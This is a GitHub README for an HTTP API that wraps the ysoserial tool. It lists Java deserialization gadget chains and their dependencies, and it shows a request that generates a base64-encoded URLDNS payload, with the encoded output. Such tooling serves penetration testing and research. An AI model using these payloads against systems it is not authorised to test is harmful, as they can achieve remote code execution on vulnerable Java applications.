# YSO-API
### API for ysoserial-all.jar

---

# ysoserial-all.jar
https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar

 

# Install & Launch
```
git clone https://github.com/NinjaGPT/yso-api/
pip install -r requirements.txt
python3 yso-api.py
```
default service port is 22222

 

# Usage

## Gain Gadget Chains Supported
```
Path:    http://yso-api-server:22222/yso/chains
Mothod:  GET
Params:  N/A
```
#### Response sample
```
{"gadget_chains":["AspectJWeaver","BeanShell1","C3P0","Click1","Clojure","CommonsBeanutils1",
  "CommonsCollections1","CommonsCollections2","CommonsCollections3","CommonsCollections4",
  "CommonsCollections5","CommonsCollections6","CommonsCollections7","FileUpload1","Groovy1",
  "Hibernate1","Hibernate2","JBossInterceptors1","JRMPClient","JRMPListener","JSON1",
  "JavassistWeld1","Jdk7u21","Jython1","MozillaRhino1","MozillaRhino2","Myfaces1",
  "Myfaces2","ROME","Spring1","Spring2","URLDNS","Vaadin1","Wicket1"]}
```

## Gain Dependencies Of Specific Gadget Chains
```
Path:    http://yso-api-server:22222/yso/deps
Method:  GET
Params:  chain=[chain_name]
```

#### Request sample:
```
http://yso-api-server:22222/yso/deps?chain=Spring1
```

#### Response sample
```
{"Spring1":"spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE"}
```

## Gain dependencies of specific gadget chains
```
Path:    http://localhost:22222/yso/payload
Method:  GET
Params:  chain=[chain_name],  cmd=[command_or_url],  encode=[encoder]

base64 and xxd encoders are supported by default, you can add more what you want.
```
#### Request sample:
```
http://localhost:22222/yso/payload?chain=URLDNS&cmd=http://google.com/&encode=base64
```
#### Response sample:
```
{"payload":"rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmV
zaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAA
Rwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIc
HJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QACmdvb2dsZS5jb210AAEvcQB+AAV0AARodHRwcHh0
ABJodHRwOi8vZ29vZ2xlLmNvbS94"}
```
---
## Screenshot
<img width="1019" alt="image" src="https://github.com/user-attachments/assets/72207db7-9e7a-4c43-9865-e7fe9ef83f35">

